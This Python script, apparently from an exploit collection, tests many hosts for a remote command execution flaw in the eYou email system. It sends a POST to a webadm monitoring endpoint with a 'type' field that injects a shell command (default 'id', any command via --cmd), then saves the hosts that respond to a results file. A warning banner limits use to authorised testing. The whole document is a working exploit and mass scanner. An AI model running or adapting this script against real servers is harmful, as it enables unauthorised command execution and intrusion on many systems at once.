#!/usr/bin/python3

import argparse
import requests

requests.packages.urllib3.disable_warnings();

def banner():
    print("");
    print("*****************************************");
    print("亿邮电子邮件系统远程命令执行漏洞批量检测工具");
    print("Author: ybdt");
    print("Date: 2021/04/13");
    print("Location: https://github.com/ybdt/exp-hub/");
    print("*****************************************");
    print("");
    print("*************************警 告*****************************");
    print("本工具旨在帮助企业快速定位漏洞、修复漏洞,仅限授权安全测试使用!");
    print("请严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!");
    print("***********************************************************");
    print("");
    print("");

def check_bug(url, cmd):
    if url.startswith("https"):
        full_url = url + "/webadm/?q=moni_detail.do&action=gragh";
    else:
        full_url = "http://" + url + "/webadm/?q=moni_detail.do&action=gragh";
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
        "content-type": "application/x-www-form-urlencoded"
    };
    payload = {"type": "'|" + cmd + "||'"};
    try:
        r = requests.post(full_url, data=payload, headers=headers, verify=False);
    except requests.exceptions.ConnectionError:
        print(full_url + "-----connection error, maybe WAF");
        return False;
    if "uid" in r.text:
        print(full_url + "-----vulnerable");
        return True;
    else:
        print(full_url + "-----not vulnerable, maybe patched");
        return False;

def main():
    banner();

    parser = argparse.ArgumentParser(description="注意：如果目标使用https协议，每行IP需要以https开头");
    parser.add_argument("-c", "--cmd", default="id",
                        help="批量检测漏洞时执行的命令，默认命令是：id");
    parser.add_argument("file",
                        help="包含IP列表的文件，IP每行一个");
    args = parser.parse_args();
    ip_file = args.file
    cmd = args.cmd;

    with open(ip_file, "r") as f_r:
        with open("result.txt", "w") as f_w:
            lines = f_r.readlines();
            for line in lines:
                url = line.strip("\n");
                vulnerable = check_bug(url, cmd);
                if vulnerable == True:
                    f_w.write(url + "\n");
                else:
                    continue;

main();
